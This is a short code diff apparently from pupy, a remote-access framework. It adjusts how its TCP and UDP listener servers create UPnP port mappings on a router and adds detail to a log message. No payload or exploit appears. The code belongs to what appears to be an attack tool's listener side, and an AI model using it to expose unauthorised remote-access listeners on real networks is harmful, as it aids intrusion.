@@ -90,14 +90,15 @@ class PupyTCPServer(ThreadedServer):
                     'TCP',
                     self.port,
                     intIP=self.host if self.host and self.host not in (
-                        '', '0.0.0.0', 'igd'
+                        '', 'igd'
                     ) else None,
                     desc='pupy'
                 )
                 self.igd_mapping = True
             except UPNPError as e:
                 self.logger.warn(
-                    "Couldn't create IGD mapping: {}".format(e.description))
+                    "Couldn't create IGD mapping [TCP {} -> {}, IP={}]: {}".format(
+                        self.external_port, self.port, self.igd.intIP, e.description))
 
 
     def _setup_connection(self, sock, queue):
@@ -276,7 +277,7 @@ class PupyUDPServer(object):
                     'UDP',
                     self.port,
                     intIP=self.host if self.host and self.host not in (
-                        '', '::', '0.0.0.0', 'igd'
+                        '', 'igd'
                     ) else None,
                     desc='pupy'
                 )
